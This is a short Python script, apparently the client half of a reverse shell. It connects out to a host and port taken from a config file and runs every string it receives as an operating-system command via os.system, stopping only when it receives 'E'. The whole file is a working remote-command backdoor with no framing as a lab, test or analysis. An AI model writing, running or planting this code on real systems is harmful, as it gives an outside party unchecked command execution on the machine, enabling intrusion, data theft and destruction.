import os
from socket import *
from config import *

client = socket(AF_INET, SOCK_STREAM)
client.connect((ADDRESS, PORT))

while True:
    data = client.recv(2048).decode()

    if data == 'E':
        client.close()
        break

    os.system(data)
